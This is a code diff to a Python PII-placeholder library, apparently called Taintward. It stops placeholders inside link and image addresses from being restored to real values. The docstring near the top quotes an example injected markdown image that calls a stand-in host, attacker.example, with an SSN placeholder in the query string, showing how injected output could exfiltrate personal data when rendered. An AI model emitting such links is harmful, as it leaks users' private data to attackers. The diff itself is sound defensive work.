@@ -34,6 +34,13 @@ conversation id; the vault entries are tagged with a subject so one call to
 already knows even when the detector misses it in a new context (for example
 a bare name in a tool argument), so restoring never lets a known value slip
 past the gate.
+
+Placeholders inside a link or image address are not restored (gap G1 in
+docs/threat-model.md): an injected ``![x](https://attacker.example/?d=<SSN_1>)``
+would otherwise become an image request that carries the real SSN as soon
+as the answer is rendered as markdown or HTML. They stay as placeholders and
+are reported as ``blocked``. ``restore_in_urls=True`` (or
+``TAINTWARD_RESTORE_IN_URLS=1``) turns the check off.
 """
 
 from __future__ import annotations
@@ -44,6 +51,7 @@ import hashlib
 import hmac
 import json
 import logging
+import os
 import re
 import threading
 import unicodedata
@@ -120,6 +128,7 @@ _LABELS = {
     "ORGANIZATION": "ORG",
     "IN_AADHAAR": "AADHAAR",
     "IN_PAN": "PAN",
+    "OVERSIZE_VALUE": "TOO_LARGE",
 }
 
 # Labels that look like Taintward placeholders even when this map does not
@@ -131,6 +140,34 @@ _LABEL_SAFE = re.compile(r"[^A-Z0-9]+")
 # Known values shorter than this are not force-redacted by find_known: a two
 # letter value would match inside too many unrelated words.
 _MIN_KNOWN_LEN = 3
+
+# Link and image addresses (gap G1). A placeholder is inside one when the
+# word it is part of starts a URL, or when it sits in a markdown link target
+# or an HTML URL attribute that is still open on the same line (those may
+# hold spaces).
+_URL_START = re.compile(r"(?i)[a-z][a-z0-9+.\-]*://|\bwww\.|(?<![a-z])(?:mailto|data):")
+_URL_ATTR = re.compile(
+    r"""(?i)\b(?:href|src|srcset|action|formaction|poster|background|cite|ping|data)"""
+    r"""\s*=\s*(["'])""")
+
+
+def restore_in_urls_default() -> bool:
+    return os.environ.get("TAINTWARD_RESTORE_IN_URLS", "").lower() in ("1", "true", "yes")
+
+
+def in_url(text: str, pos: int) -> bool:
+    """Is position ``pos`` of ``text`` inside a link or image address?"""
+    line = text[text.rfind("\n", 0, pos) + 1:pos]
+    word = line[max(line.rfind(" "), line.rfind("\t")) + 1:]
+    if _URL_START.search(word):
+        return True
+    i = line.rfind("](")
+    if i >= 0 and ")" not in line[i + 2:]:
+        return True
+    attr = None
+    for attr in _URL_ATTR.finditer(line):
+        pass
+    return attr is not None and attr.group(1) not in line[attr.end():]
 
 
 def label_for(entity_type: str | None, sensitivity: Sensitivity) -> str:
@@ -184,13 +221,15 @@ class PlaceholderMap:
     index_key: secret key for the keyed hashes used in vault keys. Default is
         derived from the FPE key (``taintward.sdk.redact.get_redactor().key``), so vault
         keys do not reveal values or conversation ids.
+    restore_in_urls: also restore placeholders inside link and image
+        addresses. Default False (``TAINTWARD_RESTORE_IN_URLS``), see gap G1.
 
     Thread safe: frameworks run tools in threads that share the run's map.
     """
 
     def __init__(self, *, vault: Any = None, conversation_id: str | None = None,
                  ttl: float | None = None, index_key: bytes | None = None,
-                 tolerant: bool = True) -> None:
+                 tolerant: bool = True, restore_in_urls: bool | None = None) -> None:
         if vault is not None and not conversation_id:
             raise ValueError("a vault-backed PlaceholderMap needs a conversation_id")
         self._lock = threading.RLock()
@@ -200,6 +239,8 @@ class PlaceholderMap:
         self._known_re: re.Pattern | None = None
         self._vault = vault
         self.tolerant = tolerant
+        self.restore_in_urls = (restore_in_urls_default() if restore_in_urls is None
+                                else restore_in_urls)
         self.conversation_id = conversation_id
         self.ttl = ttl
         if vault is not None:
@@ -319,13 +360,17 @@ class PlaceholderMap:
                 out.append(KnownSpan(e.entity_type, m.start(), m.end(), e.sensitivity))
         return out
 
-    def restore_text(self, text: str) -> str:
+    def restore_text(self, text: str, before: str = "") -> str:
         """Swap every known placeholder in ``text`` for its real value.
 
         Unknown placeholders (for example ones the model invented) are left as
-        they are. A string that is a JSON object or array (tool call
-        arguments) is restored inside the parsed JSON, so a real value with a
-        quote or backslash stays valid JSON."""
+        they are, and so are placeholders inside a link or image address
+        (unless ``restore_in_urls``). A string that is a JSON object or array
+        (tool call arguments) is restored inside the parsed JSON, so a real
+        value with a quote or backslash stays valid JSON.
+
+        ``before``: text that came before ``text`` (earlier stream chunks),
+        used only to see whether a placeholder continues a link address."""
         if not isinstance(text, str) or not text:
             return text
         # JSON first: tool call arguments from some servers (Ollama) escape
@@ -343,15 +388,25 @@ class PlaceholderMap:
         if not self._might_have(text):
             return text
 
+        tail = before[-2000:]
+
+        def blocked(m: re.Match) -> bool:
+            return not self.restore_in_urls and in_url(tail + text, len(tail) + m.start())
+
         if not self.tolerant:
             def sub(m: re.Match) -> str:
                 entry = self._entry(_canonical(m))
-                return entry.value if entry else m.group(0)
+                return entry.value if entry and not blocked(m) else m.group(0)
 
             return PLACEHOLDER_RE.sub(sub, text)
 
         spaced = self._spaced_ok(text)
-        return _TOLERANT_RE.sub(lambda m: self._classify(m, spaced)[0] or m.group(0), text)
+
+        def tolerant_sub(m: re.Match) -> str:
+            value = self._classify(m, spaced)[0]
+            return value if value is not None and not blocked(m) else m.group(0)
+
+        return _TOLERANT_RE.sub(tolerant_sub, text)
 
     def _might_have(self, text: str) -> bool:
         pattern = _TOLERANT_RE if self.tolerant else PLACEHOLDER_RE
@@ -452,20 +507,36 @@ class PlaceholderMap:
           text as the model wrote it.
         * ``unknown``: placeholders that are not in the map, for example an
           invented ``<PERSON_3>``.
+        * ``blocked``: known placeholders inside a link or image address,
+          left as placeholders on purpose (gap G1).
         """
-        out: dict[str, list[str]] = {"repaired": [], "lost": [], "unknown": []}
+        out: dict[str, list[str]] = {"repaired": [], "lost": [], "unknown": [], "blocked": []}
         if not isinstance(text, str) or not text:
             return out
+        if text.lstrip()[:1] in ("{", "[") and self._might_have(text):
+            try:  # tool call arguments: check each string, as restore_text does
+                parsed = json.loads(text)
+            except ValueError:
+                parsed = None
+            if isinstance(parsed, (dict, list)):
+                for v in _strings(parsed):
+                    for k, found in self.diagnose(v).items():
+                        out[k].extend(found)
+                return out
         if not self.tolerant:
             for m in PLACEHOLDER_RE.finditer(text):
                 if self._entry(_canonical(m)) is None:
                     label = _norm_label(m.group(1))
                     if self._unknown_kind(label) == "unknown":
                         out["unknown"].append(m.group(0))
+                elif not self.restore_in_urls and in_url(text, m.start()):
+                    out["blocked"].append(m.group(0))
         else:
             spaced = self._spaced_ok(text)
             for m in _TOLERANT_RE.finditer(text):
-                _, kind = self._classify(m, spaced)
+                value, kind = self._classify(m, spaced)
+                if value is not None and not self.restore_in_urls and in_url(text, m.start()):
+                    kind = "blocked"
                 if kind in out:
                     out[kind].append(m.group(0).strip())
         labels = self._labels()
@@ -707,11 +778,12 @@ def check_output(pmap: PlaceholderMap, raw_output: Any, *, span: Any = None,
                  strict: bool = False) -> dict[str, list[str]]:
     """Check a model answer (the placeholder version, before restore).
 
-    Records ``taintward.placeholders.repaired`` / ``.lost`` / ``.unknown``
-    on ``span`` (placeholder forms only, never values), logs a warning when
-    something could not be restored, and raises ``PlaceholderRestoreError``
-    in strict mode."""
-    found: dict[str, list[str]] = {"repaired": [], "lost": [], "unknown": []}
+    Records ``taintward.placeholders.repaired`` / ``.lost`` / ``.unknown`` /
+    ``.blocked`` on ``span`` (placeholder forms only, never values), logs a
+    warning when something could not be restored, and raises
+    ``PlaceholderRestoreError`` in strict mode. Blocked placeholders (inside
+    a link address, gap G1) are logged but never raise."""
+    found: dict[str, list[str]] = {"repaired": [], "lost": [], "unknown": [], "blocked": []}
     for s in _strings(raw_output):
         for k, v in pmap.diagnose(s).items():
             found[k].extend(v)
@@ -727,6 +799,9 @@ def check_output(pmap: PlaceholderMap, raw_output: Any, *, span: Any = None,
                     "(lost: %s; unknown: %s)", found["lost"][:5], found["unknown"][:5])
         if strict:
             raise PlaceholderRestoreError(found["lost"], found["unknown"])
+    if found["blocked"]:
+        log.warning("taintward: placeholders inside link addresses were not restored: %s",
+                    found["blocked"][:5])
     return found
 
 
@@ -734,5 +809,5 @@ __all__ = [
     "PLACEHOLDER_RE", "PlaceholderMap", "KnownSpan", "label_for",
     "current", "activate", "deactivate", "scope", "restore",
     "INSTRUCTION", "PlaceholderRestoreError", "placeholders_in", "instruction_for",
-    "check_output",
+    "check_output", "in_url",
 ]
